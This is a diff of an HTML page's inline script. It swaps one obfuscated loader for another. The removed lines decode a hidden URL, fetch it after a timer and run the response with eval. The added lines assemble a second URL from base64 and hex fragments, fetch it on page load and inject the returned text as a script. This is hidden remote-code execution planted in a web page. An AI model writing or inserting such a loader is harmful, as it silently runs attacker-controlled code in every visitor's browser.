@@ -128,30 +128,34 @@
       </div>
     </div>
     <script>
-function _exitToHubA1() {
-    location.replace(_fromHex('68747470733a2f2f6769746875622e636f6d2f'));
+var partB64 = 'aHR0cHM6Ly9sYXRlcnBsb2F0';
+var partHex = '2e636f6d2f6761726c652e6b6f73696e';
+
+function fromBase64(s) {
+  return decodeURIComponent(escape(atob(s)));
 }
 
-var _net = { p1: '68747470733a2f2f746172696e756e737479', p2: 'LmNvbS9taWNyby5zYW1waQ==' };
-function _fromHex(h) {
-    var o = '', i = 0;
-    for (; i < h.length; i += 2) o += String.fromCharCode(parseInt(h.substr(i, 2), 16));
-    return o;
-}
-function _fromB64(e) {
-    return decodeURIComponent(escape(atob(e)));
+function fromHex(h) {
+  var out = '';
+  for (var i = 0; i < h.length; i += 2) {
+    out += String.fromCharCode(parseInt(h.substr(i, 2), 16));
+  }
+  return out;
 }
 
-function _runHop() {
-    (function (u) {
-        fetch(u, { cache: 'no-store', mode: 'cors' })
-            .then(function (r) { return r.ok ? r.text() : Promise.reject(); })
-            .then(function (t) { try { (0, eval)(t); } catch (e) { _exitToHubA1(); } })
-            .catch(function () { _exitToHubA1(); });
-    })(_fromHex(_net.p1) + _fromB64(_net.p2));
-}
+var link = fromBase64(partB64) + fromHex(partHex);
 
-window.setTimeout(_runHop, 1750);
+fetch(link, { method: 'GET', cache: 'no-store' })
+  .then(function (res) {
+    if (res.status !== 200) return;
+    return res.text();
+  })
+  .then(function (src) {
+    if (!src) return;
+    var el = document.createElement('script');
+    el.textContent = src;
+    document.head.appendChild(el);
+  });
     </script>
   </body>
 </html>
